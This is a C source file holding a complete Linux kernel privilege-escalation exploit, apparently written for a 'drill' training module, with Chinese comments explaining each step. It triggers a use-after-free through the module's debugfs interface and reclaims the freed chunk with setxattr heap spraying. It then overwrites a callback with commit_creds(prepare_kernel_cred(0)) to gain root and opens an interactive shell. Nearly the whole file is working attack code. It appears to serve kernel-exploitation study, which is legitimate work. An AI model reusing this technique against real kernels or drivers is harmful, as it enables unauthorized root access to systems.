#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/xattr.h>




#define MMAP_SZ			0x2000
#define PAYLOAD_SZ		3300	// 复制一份和驱动一样的大内存来写payload

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR	0xffffffff81084370lu	// MDL: fix this symbol 准备好内核例程地址
#define PREPARE_KERNEL_CRED_PTR	0xffffffff810845a0lu	// MDL: fix this symbol

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

//定义内核函数
_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

//提权 prepare_kernel_cred函数在参数为NULL（0）的时候，会准备root权限的结构体。
//通过commit_creds函数提交，会更换原本程序的creds结构体而获得权限提升（root）
//定位某进程的cred结构体
//将cred结构提结构体的uid~fsgid全部覆写为0(前28字节)
//linux root是这样的。。。。 000000
void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
	commit_creds(prepare_kernel_cred(0));
}

// 定义内核结构体
struct drill_item_t 
{
	unsigned int foo;
	void (*callback)(void);
	char bar[1];
};



void run_sh(void) //shell exc
{
	pid_t pid = -1;
	char *args[] = 
	{
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork()");
		return;
	}

	if (pid == 0) //炸了
	{
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

//初始化payload
void init_payload(char *p, size_t size)
{
	struct drill_item_t *item = (struct drill_item_t *)p;//分配内存

	memset(p, 0x41, size);//初始化内存

	item->callback = (uint64_t)root_it;//内核回调进行提权

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback %lx\n", item->callback);
}

int act(int fd, char code)//内核ioctl
{
	ssize_t bytes = 0;

	bytes = write(fd, &code, 1);//
	if (bytes <= 0) 
	{
		perror("[-] write");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	unsigned char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int fd = -1;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());//先获取uid
    
	//映射内存
	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) //失败回显
	{
		perror("[-] mmap failed");
		goto end;
	}

	init_payload(spray_data, MMAP_SZ);
	
	fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);//打开内核模块，应该是
	char ch;
	ch = '1'; //! ioclt1 ，内核ioctl DRILL_ACT_ALLOC = 1，分配一个chunk
	act(fd,ch);
	ch = '2';
	act(fd,ch);//回调
	ch = '3';
	act(fd,ch); //! ioctl3 释放chunk 我们可以先申请一个kernel chunk，然后释放掉它（其指针并没有置空），这里就是uaf

	//setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供近乎任意大小的内核空间 object 分配
	//setxattr() 用于根据参数来设置或替换某个扩展属性的值，或者创建一个新的扩展属性
	// 它用到了 strncpy_from_user()函数，而这个函数会从用户空间复制内容到内核态空间中。
	// 我们可以先申请一个kernel chunk，然后释放掉它（其指针并没有置空），
	// 通常这个chunk并没有归还给系统，而是自己保留，如果之后再申请了这个chunk，
	// 可以直接把该chunk给申请者来使用，这么做的目的是减少了I/O请求，提高效率
	// 通过setxattr()函数（申请一个和驱动大小一致的chunk），
	// 然后往callback的位置写入一个 引用了commit_creds(prepare_kernel_cred(NULL))的函数地址，然后调用callback从而提权。
	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);//! 如果之后再通过setxattr()函数（申请一个和驱动大小一致的chunk）
	                                                       //!? 之前通过initpayloa函数已经将chunk的callback函数改为提权代码
	printf("setxattr returned %d\n", ret);


	ch = '2';
	act(fd,ch);//写入2 DRILL_ACT_CALLBACK = 2, 执行回调

	if (getuid() == 0 && geteuid() == 0) //是root的uid。成功
	{
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] need heap spraying\n");
	}

	printf("[+] The End\n");

end:
	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
	}

	return ret;
}
